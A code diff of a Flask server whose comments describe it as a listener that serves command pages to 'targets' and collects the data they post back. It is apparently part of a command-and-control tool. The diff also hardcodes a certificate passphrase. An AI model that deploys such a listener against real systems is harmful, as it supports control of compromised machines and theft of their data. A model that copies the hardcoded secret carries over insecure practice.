@@ -9,19 +9,21 @@ from flask import request
 
 app = flask.Flask(__name__)
 
-#CAREFULL DEBUGGER MAKE THE MENU BUG
+#CAREFULL DEBUGGER MAKE THE MAIN MENU BUG
 #app.config["DEBUG"] = True
 #app.debug = True
 
 @app.route('/<namelistener>', methods=['POST', 'GET'])
+#route is dinamicall since the pages are generated dynamically
+#see HTTPlistener.py listenerhttp() first line
 def home(namelistener):
     #return render_template('basicTemplates.html')
-
+    #GET wil display the asked page if it exist
     if flask.request.method == 'GET':
         return render_template(namelistener+'.html')
 
 
-
+    #the server will post the data given by the target back to me
     elif flask.request.method == 'POST':
         data = api_get_data(flask.request)
         print(data)
@@ -29,9 +31,12 @@ def home(namelistener):
 
 
     else:
-        print("else")
+        print("wrong way if this prints check api.py")
 
+#request have different forms
+#this function allows me to make sure the data from the target is returned to me
 def api_get_data(request):
+    #wether if it is .json or .form
     if not request.json:
         return request.form
     else:
@@ -39,14 +44,23 @@ def api_get_data(request):
 
 
 
-def runApi(x, y, *z):
+def runApi(x, y):
+    #this line make sure the page is realoaded everytime
+    #in order to display new comands
     app.config['TEMPLATES_AUTO_RELOAD'] = True
-    if z == None :
-        app.run(host=x,port=y)
-    else :
-        z = z[0]
-        zPathCert = str(z[0])
-        zPathKey = str(z[1])
-        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-        context.load_cert_chain(zPathCert, zPathKey, password='test')
-        app.run(host=x,port=y, ssl_context=context)
+    #start the server for given host and port
+    app.run(host=x,port=y)
+
+def runApiSSL(x, y, z):
+    #this line make sure the page is realoaded everytime
+    #in order to display new comands
+    app.config['TEMPLATES_AUTO_RELOAD'] = True
+    z = z[0]
+    #separate the cert and the key
+    zPathCert = str(z[0])
+    zPathKey = str(z[1])
+    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+    #for now enter PEM passphrase here (later make user enter it with input)
+    context.load_cert_chain(zPathCert, zPathKey, password='test')
+    #start the server for given host and port and SSL cert
+    app.run(host=x,port=y, ssl_context=context)
